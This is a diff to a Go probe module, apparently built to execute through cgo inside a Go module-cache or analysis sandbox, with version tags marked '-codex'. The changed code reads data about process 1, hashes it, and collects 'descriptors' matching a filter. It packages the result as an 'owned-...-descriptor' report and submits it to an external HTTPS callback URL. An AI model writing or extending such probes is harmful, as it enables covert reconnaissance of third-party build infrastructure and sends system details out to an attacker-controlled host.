@@ -28,9 +28,9 @@ var callbackURLSHA256 string
 
 const (
 	probeModule     = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion    = "v0.0.105-codex"
-	expectedOrigin  = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.105-codex"
-	expectedAgent   = "go-cgo-pkgsite-probe-v105-pacman-descriptor"
+	probeVersion    = "v0.0.107-codex"
+	expectedOrigin  = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.107-codex"
+	expectedAgent   = "go-cgo-pkgsite-probe-v107-talisman-descriptor"
 	maximumReceipt  = 128 * 1024
 	maximumResponse = 1024
 )
@@ -431,7 +431,7 @@ func validCallbackConfiguration() bool {
 	if err != nil || parsed.Scheme != "https" || parsed.Host == "" || parsed.Hostname() == "" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" ||
 		parsed.ForceQuery || parsed.Fragment != "" ||
-		parsed.Path != "/go-cgo-modcache-proof-a102/v1/descriptor-a105/"+callbackSession {
+		parsed.Path != "/go-cgo-modcache-proof-a102/v1/descriptor-a107/"+callbackSession {
 		return false
 	}
 	digest := sha256.Sum256([]byte(callbackURL))
@@ -492,9 +492,9 @@ func runSpecwrap() {
 	}
 	digest := sha256.Sum256(data)
 	report := descriptorReport{
-		Schema: "owned-pacman-descriptor/v1", Module: probeModule, Version: probeVersion,
-		CWD: cwd, PID1Bytes: len(data), PID1SHA256: hex.EncodeToString(digest[:]), Filter: "pacman",
-		Descriptors: collectSummaries(data, "pacman", false), StartedUTC: started.Format(time.RFC3339Nano),
+		Schema: "owned-talisman-descriptor/v1", Module: probeModule, Version: probeVersion,
+		CWD: cwd, PID1Bytes: len(data), PID1SHA256: hex.EncodeToString(digest[:]), Filter: "talisman",
+		Descriptors: collectSummaries(data, "talisman", false), StartedUTC: started.Format(time.RFC3339Nano),
 		FinishedUTC: time.Now().UTC().Format(time.RFC3339Nano),
 	}
 	_ = submitReport(report)
